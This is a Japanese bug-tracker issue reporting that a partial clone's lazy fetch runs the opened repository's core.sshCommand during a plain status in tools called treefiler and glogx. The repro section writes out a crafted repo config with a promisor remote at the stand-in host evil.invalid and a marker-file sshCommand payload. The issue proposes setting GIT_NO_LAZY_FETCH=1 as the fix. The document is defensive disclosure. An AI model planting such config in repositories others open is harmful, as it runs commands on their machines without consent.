# 739 (bug): partial clone の遅延 fetch が、開いた repo の core.sshCommand を status で走らせる

起票日: 2026-10-12

## 概要

issue 732 の敵対的レビューで見つかった、filter とは別の経路。`.git` ごと届いた repo を treefiler / glogx で開くだけで (キー操作なしに)、その repo の
`core.sshCommand` が走る。692 は sshCommand を「キーを押す操作 (push / pull) で走るもの」として止めないものに入れたが、遅延 fetch は status でも起きるので前提が崩れている。

## 詳細 (再現。git 2.55.0、main が再現 2026-10-12)

```sh
git init -q r && cd r && printf 'line1\nline2\nline3\nline4\n' > a.txt && git add a.txt && git commit -qm i
blob=$(git rev-parse HEAD:a.txt); git mv a.txt b.txt; printf 'line1\nline2\nline3\nX\n' > b.txt; git add b.txt   # 正確でない rename の検出に旧 blob が要る
rm .git/objects/${blob:0:2}/${blob:2}
git config core.repositoryformatversion 1; git config extensions.partialClone origin
git config remote.origin.promisor true; git config remote.origin.url ssh://evil.invalid/x
git config core.sshCommand "touch <外>/PWNED; false"
git -c core.fsmonitor=false -c log.showSignature=false -c diff.submodule=short --no-optional-locks status --porcelain=v1 -z   # rc=128 で PWNED ができる
GIT_NO_LAZY_FETCH=1 git ... status ...   # rc=128 のまま PWNED はできない ("lazy fetching disabled")
```

- レビューの報告では glogx / treefiler の `diff HEAD` も blob が無ければ同じく走った (main は status だけ再現)。log -p / show も同じ経路のはず (未検証)
- 期待: 他人の repo を開くだけで、その repo の設定のコマンドが走らない (692・732 と同じ不変条件)

## 対応方針 (案)

- subproc が起こす git の env に `GIT_NO_LAZY_FETCH=1` を付ける。`GitArgs` は引数だけを返すので、`GitArgs` を `exec` に直接渡している呼び出し (glogx の runGit / runGitTimeout・pro-con) は env を付けられない。
  入口を `GitCommand` に寄せるか、env も返す形にするかを決める。`tests/scripts/test_git_calls_hardened.sh` の検出も合わせる
- 本当に partial clone を使っている repo では、表示のための status / log で消えた blob を取りに行かなくなる (取りに行かないと表示が欠ける)。どの呼び出しに当てるかを決める

## 関連

- issue 692 (fsmonitor など)・732 (filter。この issue の出どころ)・`src/subproc/subproc.go` の `gitHarden`

## 進捗

- 2026-10-12: 起票 (732 の敵対的レビュー。main が status で再現)
